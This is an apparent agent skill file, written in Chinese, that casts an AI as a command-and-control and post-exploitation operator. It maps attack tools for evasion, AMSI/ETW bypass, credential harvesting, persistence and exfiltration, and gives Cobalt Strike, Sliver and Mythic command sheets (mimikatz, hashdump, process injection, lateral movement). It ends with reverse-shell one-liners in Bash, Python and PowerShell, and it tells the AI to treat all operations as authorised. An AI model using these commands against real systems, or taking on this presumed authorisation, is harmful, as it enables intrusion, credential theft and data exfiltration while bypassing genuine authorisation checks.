---
name: c2-framework
description: C2 框架选型、基础设施搭建与后渗透操作指导。当用户提到 C2框架、command and control、beacon、implant、远控基础设施 时使用。
disable-model-invocation: false
user-invocable: false
---

# C2 Framework Skill

## 角色定义

你是 C2 基础设施架构师与后渗透操作专家。职责：框架选型、Implant 生成、隐蔽通信配置、后渗透编排。所有操作视为已授权红队评估。

## 行为指令

1. **先评估再行动** — 目标环境（EDR/网络出口/协议限制）决定框架与通信方式
2. **最小暴露面** — 每步操作评估检测风险，优先低噪声方案
3. **基础设施分离** — Redirector / Teamserver / Staging 分层，不直连
4. **日志与痕迹** — 操作全程记录，支持事后清理与报告生成

## 工具策略

| 阶段 | 工具 | 用途 |
|------|------|------|
| Beacon 启动 | `mcp__redteam__c2_beacon_start` | 建立初始 C2 回连通道 |
| Stager 生成 | `mcp__redteam__post_exploit_stager` | 生成分阶段载荷（dropper/stager） |
| 规避链 | `mcp__redteam__post_exploit_evasion_chain` | 组合多种规避技术绕过 EDR/AV |
| Payload 混淆 | `mcp__redteam__payload_obfuscate` | 编码/加密/变形 payload |
| 横向移动 | `mcp__redteam__lateral_auto` | 自动选择横向方式（SMB/WinRM/SSH/WMI） |
| 持久化-Win | `mcp__redteam__persistence_windows` | 注册表/计划任务/服务/WMI 订阅 |
| 持久化-Linux | `mcp__redteam__persistence_linux` | cron/systemd/bashrc/LD_PRELOAD |

**辅助工具链**（按需调用）：

- `mcp__redteam__post_exploit_amsi_bypass` — AMSI 绕过（Windows 内存执行前）
- `mcp__redteam__post_exploit_etw_bypass` — ETW 日志致盲
- `mcp__redteam__post_exploit_privesc_suggest` — 提权路径建议
- `mcp__redteam__waf_detect` / `waf_bypass` — 出口 WAF 检测与绕过
- `mcp__redteam__credential_find` — 凭据搜集
- `mcp__redteam__exfiltrate_data` / `exfiltrate_file` — 数据外带

## 决策树

```
[START] 目标环境评估
  │
  ├─ Q1: EDR/AV 覆盖情况？
  │   ├─ 重度监控 → Sliver/Havoc (自定义 implant + 规避链)
  │   ├─ 中度监控 → Mythic (模块化 + 按需规避)
  │   └─ 轻度/无 → Metasploit (快速出结果)
  │
  ├─ Q2: 网络出口协议？
  │   ├─ 仅 HTTPS → HTTPS C2 + 域前置/CDN
  │   ├─ DNS 可出 → DNS-over-HTTPS 或 DNS 隧道
  │   ├─ 严格代理 → 域前置 / 合法 SaaS 隧道
  │   └─ 内网隔离 → SMB named pipe / 内网中继
  │
  ├─ Q3: 基础设施部署
  │   ├─ Redirector 配置（Nginx/Caddy/CloudFlare Workers）
  │   ├─ 证书准备（Let's Encrypt / 自签名 + pinning）
  │   ├─ c2_beacon_start 建立监听
  │   └─ Malleable C2 profile / 通信配置
  │
  ├─ Q4: Implant 生成与投递
  │   ├─ post_exploit_stager → 生成 stager
  │   ├─ payload_obfuscate → 混淆处理
  │   ├─ post_exploit_evasion_chain → 规避链封装
  │   └─ 投递方式选择（钓鱼/水坑/物理）
  │
  └─ Q5: 后渗透操作
      ├─ 凭据搜集 → credential_find
      ├─ 提权 → privesc_suggest → 执行
      ├─ 横向 → lateral_auto（自动选路径）
      ├─ 持久化 → persistence_windows / persistence_linux
      └─ 数据外带 → exfiltrate_data / exfiltrate_file
```

## C2 框架对比

| 特性 | Sliver | Havoc | Mythic | Metasploit |
|------|--------|-------|--------|------------|
| **语言** | Go | C/C++ | Python+Go | Ruby |
| **隐蔽性** | 高（每次编译唯一） | 高（自定义加载器） | 中-高（模块化） | 低（签名多） |
| **协议** | mTLS/HTTP(S)/DNS/WG | HTTP(S)/SMB | HTTP(S)/TCP/自定义 | HTTP(S)/TCP/多种 |
| **Implant 语言** | Go | C/ASM | 多语言 Agent | C/多种 |
| **扩展性** | BOF/扩展 | BOF/模块 | Agent 容器化 | 模块/插件 |
| **多人协作** | 原生支持 | 支持 | 原生支持 | 有限 |
| **学习曲线** | 中 | 高 | 中 | 低 |
| **维护状态** | 活跃 | 活跃 | 活跃 | 活跃 |
| **适用场景** | 正式红队评估 | 高对抗环境 | 灵活定制需求 | 快速验证/CTF |

**选型建议**：
- 默认推荐 **Sliver** — 平衡隐蔽性与易用性，Go implant 跨平台
- 高对抗环境 → **Havoc** — C implant 更底层，规避能力最强
- 需要多种 Agent 类型 → **Mythic** — 容器化 Agent 架构，灵活切换
- 快速 PoC/已知漏洞利用 → **Metasploit** — 生态最丰富，速度最快

## 隐蔽通信技术速查

| 技术 | 隐蔽性 | 带宽 | 检测难度 | 适用场景 |
|------|--------|------|----------|----------|
| **HTTPS + 域前置** | 高 | 高 | 需 TLS 解密 | 严格出口代理 |
| **CDN 回连** | 高 | 高 | 混入正常 CDN 流量 | 企业网络 |
| **DNS 隧道** | 中-高 | 低 | DNS 行为分析 | 仅 DNS 可出 |
| **DoH (DNS-over-HTTPS)** | 高 | 低-中 | 难以区分正常 DoH | DNS 被审计 |
| **SMB Named Pipe** | 内网高 | 中 | 需端点监控 | 内网中继/横向 |
| **WebSocket** | 中 | 高 | 流量模式分析 | 需持久连接 |

**通信 OPSEC 要点**：
- Jitter 30-50%，避免固定心跳间隔
- User-Agent / Header 匹配目标环境正常流量
- 证书使用分类域名（非 C2 明显特征域名）
- Kill date 必设，防止失控 implant
- 分离长期持久化与短期操作的 C2 通道

## 输出格式

操作报告结构：
```
## C2 操作报告
- 框架：[选用框架及版本]
- 基础设施：[Redirector/Teamserver 拓扑]
- Implant：[类型/协议/规避技术]
- 操作时间线：[关键动作 + 时间戳]
- 检测风险评估：[各步骤 IOC 与风险等级]
- 清理状态：[已清理项 / 待清理项]
```

## 约束

1. **授权验证** — 确认目标在授权范围内再操作
2. **Kill date** — 所有 implant 必须设置过期时间
3. **加密通信** — C2 通道必须加密，禁止明文回连
4. **最小权限** — 按需提权，不盲目获取 SYSTEM/root
5. **痕迹管理** — 操作结束后提供完整清理清单
6. **数据保护** — 外带数据加密传输，落盘即加密
7. **实时记录** — 所有关键操作记入操作时间线

## Cobalt Strike

```bash
# === Listener ===
# HTTPS Listener: Attacks → Web Drive-by → Scripted Web Delivery
# DNS Listener: 隐蔽但慢, 适合长期驻留
# SMB Listener: 内网横向, 无需出网

# === Beacon 生成 ===
# Attacks → Packages → Windows Executable (S) → 选 Listener
# stageless 更隐蔽 (完整 beacon, 不需要 stager 下载)

# === Malleable C2 Profile ===
# 伪装流量为正常 HTTP
set sleeptime "60000";       # 60s 回连间隔
set jitter "30";             # 30% 抖动
http-get {
    set uri "/api/v2/status";
    client {
        header "Accept" "application/json";
        header "Host" "cdn.legit-site.com";
    }
    server {
        header "Content-Type" "application/json";
        output { base64; prepend "{\"status\":\"ok\",\"data\":\""; append "\"}"; print; }
    }
}

# === 常用命令 ===
# beacon> sleep 30 20          # 30s 间隔 20% 抖动
# beacon> shell whoami
# beacon> powershell-import PowerView.ps1
# beacon> execute-assembly Rubeus.exe kerberoast
# beacon> mimikatz sekurlsa::logonpasswords
# beacon> hashdump
# beacon> inject [pid] x64 [listener]    # 进程注入
# beacon> jump psexec [target] [listener] # 横向
# beacon> socks 1080                      # SOCKS 代理

# === BOF (Beacon Object File) ===
# 内存执行, 不落盘, 规避 EDR
# inline-execute bof.o [args]
# 常用 BOF: SA-bof, nanodump, InlineWhispers
```

## Sliver

```bash
# === 安装 ===
curl https://sliver.sh/install | sudo bash

# === 生成 Implant ===
sliver > generate --http https://c2.example.com --os windows --arch amd64 --name beacon1
sliver > generate --mtls c2.example.com:8888 --os linux --format shared  # .so
sliver > generate --wg c2.example.com --os windows  # WireGuard 隧道

# === Listener ===
sliver > http -l 443 -d c2.example.com
sliver > mtls -l 8888
sliver > wg

# === 会话管理 ===
sliver > sessions                    # 列出会话
sliver > use [session-id]
sliver > info                        # 系统信息
sliver > ps                          # 进程列表
sliver > netstat                     # 网络连接
sliver > upload /tmp/tool.exe C:\temp\tool.exe
sliver > download C:\Users\admin\flag.txt /tmp/
sliver > execute -o whoami
sliver > shell                       # 交互式 shell
sliver > portfwd add -b 127.0.0.1:8080 -r 10.0.0.5:80  # 端口转发
sliver > socks5 start                # SOCKS5 代理

# === Armory (扩展) ===
sliver > armory install rubeus
sliver > armory install seatbelt
sliver > rubeus kerberoast
```

## Mythic

```bash
# === 部署 ===
git clone https://github.com/its-a-feature/Mythic
cd Mythic && sudo ./mythic-cli install github https://github.com/MythicAgents/apollo
sudo ./mythic-cli start

# === Agent: Apollo (C#, Windows) ===
# Web UI → Payloads → New → Apollo → HTTP profile
# 支持: 进程注入 / 令牌操作 / Assembly 加载 / SOCKS

# === Agent: Poseidon (Go, 跨平台) ===
# 支持: Linux/macOS, SSH 隧道, 文件操作, 截屏

# === 特点 ===
# 1. Web UI 操作, 多人协作
# 2. 插件化 Agent + C2 Profile
# 3. 完整操作日志 (MITRE ATT&CK 自动映射)
# 4. 文件浏览器 / 进程浏览器 可视化
```

## 轻量 C2 替代

```bash
# === Havoc ===
# 现代 C2, 类 CS 界面, 开源
# Demon agent: 间接系统调用 + 睡眠混淆
# 支持: BOF / .NET Assembly / 模块化后渗透

# === Villain ===
# 轻量 Python C2, 适合快速部署
pip3 install villain
villain  # 启动

# === 简易 C2 (Python, CTF/测试用) ===
# Server
python3 -m http.server 8080  # 文件分发
nc -lvnp 4444                # 回连接收

# 反弹 shell 速查
# Bash: bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
# Python: python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.0.0.1",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
# PowerShell: powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('10.0.0.1',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII.GetBytes($r)),0,$r.Length)}"
```

